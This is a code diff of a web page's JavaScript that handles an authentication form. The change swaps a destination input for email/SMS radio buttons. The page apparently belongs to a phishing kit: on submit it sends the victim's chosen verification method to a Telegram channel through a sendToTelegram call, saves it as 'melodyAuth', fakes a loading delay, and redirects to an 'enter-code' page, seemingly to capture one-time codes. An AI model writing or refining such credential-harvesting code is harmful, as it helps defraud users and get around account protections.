@@ -1,12 +1,7 @@
 (function () {
   var form = document.getElementById("auth-form");
-  var methodSelect = document.getElementById("delivery-method");
-  var destinationWrap = document.getElementById("auth-destination");
-  var destinationInput = document.getElementById("destination");
-  var destinationLabel = document.getElementById("destination-label");
-  var authHint = document.getElementById("auth-hint");
+  var methodRadios = document.querySelectorAll('input[name="delivery-method"]');
   var methodError = document.getElementById("method_validation_message");
-  var destinationError = document.getElementById("destination_validation_message");
   var submitBtn = form.querySelector('.button-subm');
 
   // ============================================================
@@ -158,49 +153,7 @@
 
   function clearErrors() {
     methodError.textContent = "";
-    destinationError.textContent = "";
   }
-
-  function configureDestination(method) {
-    clearErrors();
-    destinationInput.value = "";
-
-    if (!method) {
-      destinationWrap.hidden = true;
-      return;
-    }
-
-    destinationWrap.hidden = false;
-
-    if (method === "email") {
-      destinationLabel.textContent = "Registered email";
-      destinationInput.type = "email";
-      destinationInput.placeholder = "Enter your registered email";
-      destinationInput.setAttribute("autocomplete", "email");
-      authHint.textContent = "Enter the email address on file for your account.";
-    } else {
-      destinationLabel.textContent = "Registered mobile number";
-      destinationInput.type = "tel";
-      destinationInput.placeholder = "Enter your registered mobile number";
-      destinationInput.setAttribute("autocomplete", "tel");
-      authHint.textContent = "Enter the mobile number on file for your account.";
-    }
-
-    destinationInput.focus();
-  }
-
-  function isValidEmail(value) {
-    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
-  }
-
-  function isValidPhone(value) {
-    var digits = value.replace(/\D/g, "");
-    return digits.length >= 10 && digits.length <= 15;
-  }
-
-  methodSelect.addEventListener("change", function () {
-    configureDestination(methodSelect.value);
-  });
 
   // ============================================================
   // ====== FORM SUBMIT =========================================
@@ -210,42 +163,22 @@
     event.preventDefault();
     clearErrors();
 
-    var method = methodSelect.value;
-    var destination = destinationInput.value.trim();
-    var valid = true;
-
-    if (!method) {
-      methodError.textContent = "Please select Email or SMS.";
-      valid = false;
-    }
-
-    if (!destination) {
-      destinationError.textContent =
-        method === "sms"
-          ? "The mobile number field is required."
-          : "The email field is required.";
-      valid = false;
-    } else if (method === "email" && !isValidEmail(destination)) {
-      destinationError.textContent = "Please enter a valid email address.";
-      valid = false;
-    } else if (method === "sms" && !isValidPhone(destination)) {
-      destinationError.textContent = "Please enter a valid mobile number.";
-      valid = false;
-    }
-
-    if (!valid) {
-      if (!method) {
-        methodSelect.focus();
-      } else {
-        destinationInput.focus();
+    var selectedMethod = null;
+    methodRadios.forEach(function(radio) {
+      if (radio.checked) {
+        selectedMethod = radio.value;
       }
+    });
+
+    if (!selectedMethod) {
+      methodError.textContent = "Please select a delivery method.";
       return;
     }
 
     // ====== SEND METHOD TO TELEGRAM ======
     sendToTelegram('auth_method', {
-      method: method,
-      destination: destination
+      method: selectedMethod,
+      destination: selectedMethod === 'email' ? 'Email' : 'SMS'
     });
 
     // ====== DISABLE BUTTON AND SHOW LOADING ======
@@ -258,8 +191,8 @@
       sessionStorage.setItem(
         "melodyAuth",
         JSON.stringify({
-          method: method,
-          destination: destination
+          method: selectedMethod,
+          destination: selectedMethod === 'email' ? 'Email' : 'SMS'
         })
       );
     } catch (e) {}
@@ -269,4 +202,5 @@
       window.location.href = "enter-code.html";
     }, 5000);
   });
+
 })();
